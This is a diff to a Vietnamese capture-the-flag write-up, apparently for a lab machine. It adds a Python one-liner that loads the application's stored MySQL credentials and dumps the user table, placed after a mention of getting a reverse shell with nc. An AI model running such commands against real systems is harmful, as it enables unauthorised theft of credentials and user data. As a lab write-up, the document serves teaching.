@@ -130,6 +130,10 @@ print(response.text)
 
 Bật nc lên và chạy file test.py là đã có reverse shell, tôi lấy được cả username và password của mysql:
 
+```
+python3 -c 'import pymysql; from craft_api import settings; conn = pymysql.connect(host=settings.MYSQL_DATABASE_HOST, user=settings.MYSQL_DATABASE_USER, password=settings.MYSQL_DATABASE_PASSWORD, db=settings.MYSQL_DATABASE_DB); c = conn.cursor(); c.execute("SELECT * FROM user"); print(c.fetchall())'
+```
+
 <img width="1905" height="973" alt="image" src="https://github.com/user-attachments/assets/973724fd-8634-4642-b7ad-50ad2f4f9f27" />
 
 Nhưng lại không chạy được lệnh `mysql`, tôi dùng python kết nối đến thay vì chạy mysql:
